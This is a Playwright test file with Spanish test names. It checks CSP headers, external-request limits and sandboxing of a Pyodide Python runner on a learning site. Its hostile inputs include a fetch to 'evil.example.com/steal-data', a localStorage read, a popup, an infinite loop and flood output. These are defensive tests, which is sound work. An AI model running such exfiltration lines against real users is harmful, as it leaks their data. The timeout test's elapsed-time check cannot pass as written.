import { test, expect } from '@playwright/test';

test.describe('CSP — cabeceras y restricción de recursos externos', () => {
  test('la respuesta principal incluye Cabecera CSP', async ({ page }) => {
    const cspHeaders: string[] = [];
    page.on('response', (response) => {
      const csp = response.headers()['content-security-policy'];
      const cspRo = response.headers()['content-security-policy-report-only'];
      if (csp) cspHeaders.push(csp);
      if (cspRo) cspHeaders.push(cspRo);
    });

    await page.goto('/');
    await page.waitForTimeout(2000);

    const hasCSP = cspHeaders.some((h) => h.includes("default-src 'self'"));
    expect(hasCSP).toBe(true);
  });

  test('ningún flujo principal solicita recursos fuera del dominio (salvo Supabase y Turnstile)', async ({ page }) => {
    const externalRequests: string[] = [];
    page.on('request', (request) => {
      const url = request.url();
      const isSupabase = url.includes('supabase.co') || url.includes('supabase.fr');
      const isTurnstile = url.includes('cloudflarestorage.com') || url.includes('turnstile');
      const isOwnDomain = url.includes('localhost') || url.includes('python-desdecero');
      if (!isOwnDomain && !isSupabase && !isTurnstile) {
        externalRequests.push(url);
      }
    });

    await page.goto('/');
    await page.waitForTimeout(3000);

    // Navegar a páginas principales
    await page.goto('/login');
    await page.waitForTimeout(2000);
    await page.goto('/academia');
    await page.waitForTimeout(2000);

    const unexpected = externalRequests.filter((u) => !u.includes('googleapis') && !u.includes('gstatic'));
    expect(unexpected).toHaveLength(0);
  });
});

test.describe('Pruebas hostiles — aislamiento del código del estudiante', () => {
  test('código del estudiante no puede leer localStorage mediante Pyodide JS interop', async ({ page }) => {
    await page.goto('/python-runner');

    // Esperar a que el runner esté listo
    await page.waitForResponse('**/python-runner');
    await page.waitForTimeout(2000);

    // Código que intenta leer localStorage a través de Pyodide
    const hostileCode = `
from js import window
try:
    storage = window.localStorage
    print("LEAK:", storage.getItem("test"))
except Exception as e:
    print("BLOCKED:", type(e).__name__)
`;

    // Enviar código al runner vía postMessage (simulado desde el iframe)
    await page.evaluate((code) => {
      const iframe = document.createElement('iframe');
      iframe.src = '/python-runner';
      iframe.sandbox = 'allow-scripts';
      document.body.appendChild(iframe);
      iframe.onload = () => {
        iframe.contentWindow!.postMessage({ type: 'run', code, input: [] }, '*');
      };
    }, hostileCode);

    // Verificar que la respuesta no contenga datos de localStorage
    const pageConsole: string[] = [];
    page.on('console', (msg) => pageConsole.push(msg.text()));

    await page.waitForTimeout(5000);

    const consoleOutput = pageConsole.join('\n');
    expect(consoleOutput).not.toContain('LEAK:');
  });

  test('código del estudiante no puede hacer fetch a sitio externo', async ({ page }) => {
    await page.goto('/python-runner');

    await page.waitForTimeout(2000);

    const hostileCode = `
import urllib.request
try:
    response = urllib.request.urlopen("https://evil.example.com/steal-data")
    print("FETCH_SUCCESS:", response.status)
except Exception as e:
    print("BLOCKED:", type(e).__name__)
`;

    await page.evaluate((code) => {
      const iframe = document.createElement('iframe');
      iframe.src = '/python-runner';
      iframe.sandbox = 'allow-scripts';
      document.body.appendChild(iframe);
      iframe.onload = () => {
        iframe.contentWindow!.postMessage({ type: 'run', code, input: [] }, '*');
      };
    }, hostileCode);

    const pageConsole: string[] = [];
    page.on('console', (msg) => pageConsole.push(msg.text()));

    await page.waitForTimeout(8000);

    const consoleOutput = pageConsole.join('\n');
    expect(consoleOutput).not.toContain('FETCH_SUCCESS:');
    expect(consoleOutput).toContain('BLOCKED:');
  });

  test('bucle infinito se corta por timeout del worker', async ({ page }) => {
    await page.goto('/python-runner');

    await page.waitForTimeout(2000);

    const hostileCode = `
while True:
    pass
`;

    await page.evaluate((code) => {
      const iframe = document.createElement('iframe');
      iframe.src = '/python-runner';
      iframe.sandbox = 'allow-scripts';
      document.body.appendChild(iframe);
      iframe.onload = () => {
        iframe.contentWindow!.postMessage({ type: 'run', code, input: [] }, '*');
      };
    }, hostileCode);

    const pageConsole: string[] = [];
    page.on('console', (msg) => pageConsole.push(msg.text()));

    const startTime = Date.now();
    await page.waitForTimeout(20000);
    const elapsed = Date.now() - startTime;

    const consoleOutput = pageConsole.join('\n');
    // El timeout del worker es 15 segundos, así que debería terminar antes de 20s
    expect(elapsed).toBeLessThan(20000);
    // Debería reportar error de tiempo agotado
    expect(consoleOutput).toMatch(/Tiempo de ejecución agotado|timeout/);
  });

  test('código del estudiante no puede abrir ventanas emergentes', async ({ page }) => {
    await page.goto('/python-runner');

    await page.waitForTimeout(2000);

    const hostileCode = `
from js import window
try:
    window.open("https://evil.example.com", "_blank")
    print("OPEN_SUCCESS")
except Exception as e:
    print("BLOCKED:", type(e).__name__)
`;

    await page.evaluate((code) => {
      const iframe = document.createElement('iframe');
      iframe.src = '/python-runner';
      iframe.sandbox = 'allow-scripts';
      document.body.appendChild(iframe);
      iframe.onload = () => {
        iframe.contentWindow!.postMessage({ type: 'run', code, input: [] }, '*');
      };
    }, hostileCode);

    const pageConsole: string[] = [];
    page.on('console', (msg) => pageConsole.push(msg.text()));

    await page.waitForTimeout(5000);

    const consoleOutput = pageConsole.join('\n');
    expect(consoleOutput).not.toContain('OPEN_SUCCESS');
    expect(consoleOutput).toContain('BLOCKED:');
  });

  test('salida excesiva se trunca sin bloquear la página', async ({ page }) => {
    await page.goto('/python-runner');

    await page.waitForTimeout(2000);

    const hostileCode = `
print("A" * 50000)
`;

    await page.evaluate((code) => {
      const iframe = document.createElement('iframe');
      iframe.src = '/python-runner';
      iframe.sandbox = 'allow-scripts';
      document.body.appendChild(iframe);
      iframe.onload = () => {
        iframe.contentWindow!.postMessage({ type: 'run', code, input: [] }, '*');
      };
    }, hostileCode);

    const pageConsole: string[] = [];
    page.on('console', (msg) => pageConsole.push(msg.text()));

    await page.waitForTimeout(5000);

    const consoleOutput = pageConsole.join('\n');
    // La salida debería estar truncada (MAX_OUTPUT_LENGTH = 20000)
    expect(consoleOutput).toContain('Salida limitada');
  });

  test('el runner responde con ready después de inicializar', async ({ page }) => {
    const responses: string[] = [];
    page.on('console', (msg) => responses.push(msg.text()));

    await page.goto('/python-runner');

    await page.waitForTimeout(5000);

    // El runner debería haberse inicializado sin errores críticos
    const hasInitError = responses.some((r) => r.includes('init-error') || r.includes('No se pudo cargar Pyodide'));
    expect(hasInitError).toBe(false);
  });
});
